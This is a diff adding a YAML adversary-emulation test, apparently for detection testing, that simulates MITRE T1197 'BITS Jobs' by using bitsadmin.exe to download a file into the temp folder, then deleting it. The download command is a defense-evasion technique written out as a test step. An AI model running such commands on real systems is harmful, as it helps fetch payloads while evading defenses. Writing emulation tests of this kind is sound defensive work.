@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: Bitsadmin Download (cmd)
+description: |
+    This test simulates an adversary leveraging bitsadmin.exe to download
+    and execute a payload
+args:
+    - name: remote_file
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+    - name: local_file
+      type: path
+      default: '%temp%\bitsadmin1_flag.ps1'
+uuid: 3c73d728-75fb-4180-a12f-6712864d7421
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1197: BITS Jobs'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: bitsadmin-download-(cmd)
+      inline: |
+        bitsadmin.exe /transfer /Download /priority Foreground {{.Args.remote_file}} {{.Args.local_file}}
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del {{.Args.local_file}} >nul 2>&1
+        executor: command_prompt
